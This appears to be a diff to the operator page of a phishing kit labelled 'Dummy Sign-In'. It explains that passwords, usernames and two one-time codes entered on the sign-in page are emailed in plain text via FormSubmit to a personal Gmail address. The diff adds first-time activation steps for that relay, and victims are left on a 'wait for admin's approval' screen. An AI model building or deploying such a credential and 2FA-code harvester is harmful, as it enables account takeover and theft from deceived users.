@@ -2,6 +2,7 @@
 <html>
 <head>
   <title>Admin Portal - Dummy Sign-In</title>
+  <meta charset="UTF-8">
 </head>
 <body>
 
@@ -22,16 +23,22 @@
     <p>You are logged in as: <strong>blessedresult6@gmail.com</strong></p>
     <hr>
     <p><strong>How this works:</strong></p>
-    <p>Whenever a dummy user goes through the sign-in steps on the main page, each piece of information is sent to this email address in plain text almost immediately.</p>
+    <p>Whenever a dummy user goes through the sign-in steps on the main page (<code>index.html</code>), each piece of information is sent to this email address <strong>in plain text</strong> almost immediately via FormSubmit.</p>
     <ul>
       <li>Email + Password</li>
       <li>Username</li>
       <li>OTP 1</li>
       <li>OTP 2</li>
     </ul>
-    <p>Check the inbox of <strong>blessedresult6@gmail.com</strong> for the latest submissions (subject starts with "Dummy Sign-In - ...").</p>
-    <p>There is no real-time list here because this is a static dummy site with no backend. All data arrives only by email.</p>
+    <p>Check the inbox (and spam folder) of <strong>blessedresult6@gmail.com</strong> for emails whose subject starts with <code>Dummy Sign-In - ...</code>.</p>
+    <p>There is no real-time list here because this is a static dummy site with no backend. All data arrives only by email in plain text.</p>
     <br>
+    <p><strong>Important first-time setup:</strong></p>
+    <ol>
+      <li>Open the user page once and submit any dummy data.</li>
+      <li>FormSubmit will send a confirmation email to <strong>blessedresult6@gmail.com</strong>.</li>
+      <li>Click the activation link in that email. After that, all future submissions will arrive automatically.</li>
+    </ol>
     <p>After the user finishes OTP 2 they see a waiting page saying "Please wait for admin’s approval".</p>
   </div>
 
